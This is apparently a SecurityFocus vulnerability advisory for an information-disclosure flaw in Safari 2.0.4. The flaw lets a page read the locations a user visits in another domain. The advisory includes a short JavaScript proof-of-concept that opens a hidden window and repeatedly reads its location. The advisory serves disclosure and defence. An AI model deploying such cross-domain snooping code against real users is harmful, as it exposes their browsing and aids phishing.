source: http://www.securityfocus.com/bid/24121/info

Apple Safari is prone to an information-disclosure vulnerability because it fails to properly enforce cross-domain JavaScript restrictions.

Exploiting this issue may allow attackers to access locations that a user visits, even if it's in a different domain than the attacker's site. The most common manifestation of this condition would typically be in blogs or forums. Attackers may be able to access potentially sensitive information that would aid in phishing attacks.

This issue affects Safari 2.0.4; other versions may also be affected. 

var snoopWin;

function run() {
	snoopWin = window.open('http://www.google.com/','snoopWindow','width=640,height=480');
	snoopWin.blur();
	setTimeout("snoopy()", 5000);	
}

function snoopy() {
	alert(snoopWin.location);
	setTimeout("snoopy()", 5000);
}